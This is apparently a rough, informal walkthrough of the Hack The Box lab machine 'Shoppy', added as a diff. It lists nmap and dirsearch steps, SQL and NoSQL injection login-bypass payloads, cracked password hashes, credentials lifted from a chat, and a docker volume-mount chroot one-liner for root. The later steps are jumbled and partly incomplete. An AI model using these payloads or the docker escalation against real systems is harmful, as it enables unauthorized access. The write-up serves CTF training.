@@ -1,0 +1,99 @@
+target domain: http://shoppy.htb
+target IP: 10.10.11.180
+
+now we know the target ip.
+let's gather some info using some tool or technique.
+
+>> scanning using nmap.
+--> nmap -sC -sV 10.10.11.180 -O
+ to see the report.
+open port      service name 		service version
+22 			Open SSH 		
+80			Http			Nginx 1.23.1
+
+>> find directory of this website.
+--> using dirsearch.
+    ..> /login
+    ..> /login/
+
+let's try to go to this directory.
+when we go to /login/ dir there are a login form.
+
+let's try some SQL code.
+----> admin' OR '1=1'
+----> administrator'--
+----> admin'OR'1=1'--
+
+but they show the 504 gateway timeout Nginx 1.23.1 error.
+
+ok now let's try to find out the other bug.
+
+Ok let's try to use NoSql Code.
+
+What is No Sql ?
+>> NoSQL injection occurs when a query, most commonly delivered by an end-user, is not sanitized, 
+allowing the attacker to include malicious input that executes an unwanted command on the database.
+
+ok now let's try some code.'
+		i found some NosQl Code On  Internet.
+----> Username: admin'||'1==1
+----> Pass: admin
+
+when i put this code i am in the admin pannel.
+and i search admin.
+----> when i search admin. the shoopy site outomatic show. the id username or password.
+-iD: "62db0e93d6d6a999a66ee67a"
+username: "admin"
+password: "23c6877d9e2b564ef8b32c3a23de27b2"
+
+_id	"62db0e93d6d6a999a66ee67a"
+username	"admin"
+password	"23c6877d9e2b564ef8b32c3a23de27b2"
+1	
+_id	"62db0e93d6d6a999a66ee67b"
+username	"josh"
+password	"6ebcea65320589ca4f2f1ce039975995" = remembermethisway
+ok the username is plain text that good . but the password is hash format let's crack it.
+
+i am using google website to crack the password.
+---> remembermethisway
+
+lat's find out the Root User.
+http://mattermost.shoppy.htb/shoppy/channels/coffee-break
+
+Hey @josh,
+
+For the deploy machine, you can create an account with these creds :
+username: jaeger
+password: Sh0ppyBest@pp!
+
+ok now we found the pass or username.
+let's connect with ssh
+--> ssh jaeger@10.10.11.180
+
+--> cat user.txt
+>> e94ed4c2b42d5aef6c7717261ab5a1a5 = flag
+
+ok 
+>> cd /home/deploy
+sudo -u deploy /home/deploy/password-manager
+>> Welcome to Josh password manager!Please enter your master password: Sample
+
+
+Ducker cmd.
+>> 
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+
+ssh deploy@10.10.11.180
+password: Deploying@pp!
+
+>> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+but there are no connected they aks me a master password. 
+
+
+
+
+	
